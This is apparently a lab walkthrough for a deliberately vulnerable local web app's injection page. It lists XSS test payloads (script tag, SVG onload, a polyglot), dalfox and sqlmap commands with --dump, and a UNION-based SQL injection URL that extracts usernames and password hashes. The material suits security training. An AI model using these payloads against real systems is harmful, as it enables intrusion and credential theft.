---
icon: syringe
---

# A03 - Injection

Injection vulnerabilities allow attackers to execute malicious code within a web application, affecting databases, scripts, or other parts of the application. In this example, we have both an **SQL Injection** and a **Cross-Site Scripting (XSS)** vulnerability on a specific page. Here’s how each can be exploited.

## Cross-Site Scripting (XSS)

For XSS, we can test by inputting `<script>alert(1)</script>` in the search field, and it triggers successfully. Other payloads, such as the following SVG payload or a polyglot, can also be used to test for XSS:

```html
"><svg/onload=alert(1)>
```

Polyglot XSS example:

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

Reference for polyglot payloads: [HackVault XSS Polyglot](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)

We can also use tools like [dalfox](https://github.com/hahwul/dalfox) to automate XSS testing:

```bash
dalfox url http://localhost:8042/A03.php -X POST -d comment=test
```

## SQL Injection (SQLi)

To test for SQL Injection, we can use **SQLmap (or Ghauri ofc** 😉) to automate the detection and exploitation of SQLi vulnerabilities:

```bash
sqlmap -u "http://localhost:8042/A03.php?username=admin"
sqlmap -u "http://localhost:8042/A03.php?username=admin" --dump
```

For a manual SQL Injection test, try this URL to extract data from the database:

```url
http://localhost:8042/A03.php?username=admi%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71786b6a71%2CJSON_ARRAYAGG%28CONCAT_WS%280x6176666d7877%2Cid%2Cmd5_password%2Cusername%29%29%2C0x717a767171%29%2CNULL%20FROM%20vulnerable_app.users--%20-
```

This payload attempts to perform a SQL UNION-based injection to retrieve sensitive data from the `users` table.

